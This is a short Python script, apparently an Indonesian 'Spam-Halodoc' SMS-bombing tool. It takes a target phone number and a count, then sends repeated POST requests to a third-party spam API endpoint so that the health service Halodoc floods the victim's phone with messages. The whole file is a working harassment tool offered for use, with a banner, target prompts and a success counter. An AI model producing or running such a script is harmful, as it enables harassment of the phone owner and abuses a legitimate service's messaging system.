import requests, time,os
os.system("clear")

print ("""\033[1;36m
       =======°°°°=======.)..)..)..).
       |+ Spam-Halodoc +|  ███████ ═╮
       |~~~ [MrDseC] ~~~|  ███████ ▏ ∥
       =======°°°°=======  ███████ ═╯
         COFFEE FOREVER    ◥█████◤
""")
print ("\033[1;37mMASUKKAN NOMOR \033[1;31mTARGET")
print ("\033[1;37mCONTOH \033[1;31m08215xxxxx")
print ("\033[1;31mALERT!! \033[1;37mBATAS KIRIM 5 PESAN PERJAM:)")

num=input("\033[1;36mNomor Target: ")
jum=int(input("Jumlah: "))

print("\n[RESULT]")
for x in range(jum):
	try:
		req=requests.post("https://nuubi.herokuapp.com/api/spam/alodok",
			data={"number":num})
		if req.json()['status'] == 'ok':
			print(f"{x+1}. Berhasil {num}")
		else:
			print(f"{x+1}. Gagal {num}")
	except Exception as e:
		print(f"{x+1}. Pass: {e}")
